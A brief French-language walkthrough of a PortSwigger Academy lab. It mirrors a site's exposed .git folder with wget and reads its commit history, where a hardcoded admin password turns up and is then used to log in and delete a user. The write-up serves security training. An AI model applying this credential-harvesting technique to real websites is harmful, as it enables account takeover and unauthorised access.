# Lab

https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-in-version-control-history

## Payload

On sait que ca concerne git, donc j'essaie de voir si le dossier `.git` est accessible : `https://0a8400e204564fdb8087e47b001b00e1.web-security-academy.net/.git`

Sur un linux :

```
wget -r https://0a8400e204564fdb8087e47b001b00e1.web-security-academy.net/.git
cd 0a8400e204564fdb8087e47b001b00e1.web-security-academy.net/.git
git log -p
...
-ADMIN_PASSWORD=lqdc54tsybqf7k8dlnje
+ADMIN_PASSWORD=env('ADMIN_PASSWORD')
...
```

On se connecte et on supprie l'utilisateur `carlos` pour valider le lab.